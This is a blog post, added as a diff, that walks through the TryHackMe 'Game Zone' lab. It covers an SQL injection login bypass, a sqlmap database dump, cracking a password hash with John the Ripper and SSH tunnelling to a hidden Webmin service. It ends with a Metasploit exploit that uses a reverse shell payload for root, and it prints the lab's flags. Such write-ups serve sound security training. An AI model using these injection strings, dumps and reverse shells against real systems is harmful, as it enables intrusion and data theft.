@@ -1,0 +1,196 @@
+---
+layout: post
+title: Box - Game Zone
+published: true
+---
+
+Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!
+
+[https://tryhackme.com/room/gamezone](https://tryhackme.com/room/gamezone)
+
+![](/assets/hitman.jpg)
+
+* * *
+
+## Task 1 - Deploy the Vulerable Machine
+
+This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges. 
+
+##   Answer the questions below
+
+Deploy the machine and access its web server.
+
+**What is the name of the large cartoon avatar holding a sniper on the forum?**
+
+- Agent 47
+
+* * * 
+
+## Task 2 - Obtain access via SQLi 
+
+In this task you will understand more about SQL (structured query language) and how you can potentially manipulate queries to communicate with the database.
+
+SQL is a standard language for storing, editing and retrieving data in databases. A query can look like so:
+
+- ``SELECT * FROM users WHERE username = :username AND password := password``
+
+If we have our username as admin and our password as: ' or 1=1 -- - it will insert this into the query and authenticate our session.
+
+The SQL query that now gets executed on the web server is as follows:
+
+``SELECT * FROM users WHERE username = admin AND password := ' or 1=1 -- -``
+
+GameZone doesn't have an admin user in the database, however you can still login without knowing any credentials using the inputted password data we used in the previous question.
+
+Use ``' or 1=1 -- -`` as your username and leave the password blank.
+
+**When you've logged in, what page do you get redirected to?**
+
+- portal.php
+
+## Task 3 - Using SQLMap 
+
+- capture request to ``portal.php`` and copy to file to feed to SQLMap so we can have the authenitcated user session.
+
+```shell
+POST /portal.php HTTP/1.1
+Host: 10.10.147.210
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 18
+Origin: http://10.10.147.210
+Connection: close
+Referer: http://10.10.147.210/portal.php
+Cookie: PHPSESSID=i6ngovs5ocoho38fkusrttnm23
+Upgrade-Insecure-Requests: 1
+
+searchitem=awesome
+```
+
+- ``sqlmap -r request.txt --dbms=mysql --dump``
+- ``-r`` for request file
+- ``--dbms=mysql`` database management system type
+- ``-dump`` outputs the entire database or attemps to
+
+##   Answer the questions below
+
+**In the users table, what is the hashed password?**
+
+- ``cat log``
+
+```shell
+Database: db
+Table: users
+[1 entry]
++------------------------------------------------------------------+----------+
+| pwd                                                              | username |
++------------------------------------------------------------------+----------+
+| ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 | agent47  |
++------------------------------------------------------------------+----------+
+````
+
+**What was the username associated with the hashed password?**
+
+- agent47
+
+**What was the other table name?**
+
+- post
+
+* * * 
+
+## Task 4 - Cracking a password with JohnTheRipper 
+
+![](/assets/johntheripper.png)
+
+##   Answer the questions below
+
+**What is the de-hashed password?**
+
+1. ``echo ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 > ../agent47-hash.txt``
+2. ``john agent47-hash.txt --wordlist=/usr/share/seclists/Passwords/rockyou.txt --format=Raw-SHA256``
+3. videogamer124
+
+**Now you have a password and username. Try SSH'ing onto the machine.** **What is the user flag?**
+
+```shell
+agent47@gamezone:~$ cat user.txt
+649ac17b1480ac13ef1e4fa579dac95c
+```
+
+* * * 
+
+## Task 5 - Exposing services with reverse SSH tunnels 
+
+Reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.
+
+-L is a local tunnel (YOU <-- CLIENT). If a site was blocked, you can forward the traffic to a server you own and view it. For example, if imgur was blocked at work, you can do ssh -L 9000:imgur.com:80 user@example.com. Going to localhost:9000 on your machine, will load imgur traffic using your other server.
+
+-R is a remote tunnel (YOU --> CLIENT). You forward your traffic to the other server for others to view. Similar to the example above, but in reverse.
+
+##   Answer the questions below
+
+We will use a tool called ``ss`` to investigate sockets running on a host.
+
+If we run ``ss -tulpn`` it will tell us what socket connections are running
+
+| Argument | Description |
+|----------|-------------|
+| -t | Display TCP sockets |
+| -u | Display UDP sockets |
+| -l | Displays only listening sockets |
+| -p | Shows the process using the socket |
+| -n | Doesn't resolve service names |
+
+```shell
+agent47@gamezone:~$ ss -tulpn
+Netid State      Recv-Q Send-Q   Local Address:Port        Peer Address:Port              
+udp   UNCONN     0      0                    *:10000                  *:*                  
+udp   UNCONN     0      0                    *:68                     *:*                  
+tcp   LISTEN     0      80           127.0.0.1:3306                   *:*                  
+tcp   LISTEN     0      128                  *:10000                  *:*                  
+tcp   LISTEN     0      128                  *:22                     *:*                  
+tcp   LISTEN     0      128                 :::80                    :::*                  
+tcp   LISTEN     0      128                 :::22                    :::*         
+````
+
+**How many TCP sockets are running?**
+
+- 5
+
+We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!
+
+From our local machine, run ``ssh -L 10000:localhost:10000 <username>@<ip>``
+
+Once complete, in your browser type "localhost:10000" and you can access the newly-exposed webserver.
+
+**What is the name of the exposed CMS?**
+
+1. visit ``localhost:10000``
+2. Webmin
+
+**What is the CMS version?**
+
+1. login with credentials
+2. 1.580
+
+* * * 
+
+## Task 6 - Privilege Escalation with Metasploit 
+
+Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.
+
+##   Answer the questions below
+
+**What is the root flag?**
+
+1. ``msfconsole``
+2. ``use unix/webapp/webmin_show_cgi_exec``
+3. set options and ``set SSL false``
+4. ``set payload cmd/unix/reverse`` 
+5. visit /root directory and cat the flag ``a4b945830144bdd71908d12d902adeee``
+
+* * * 
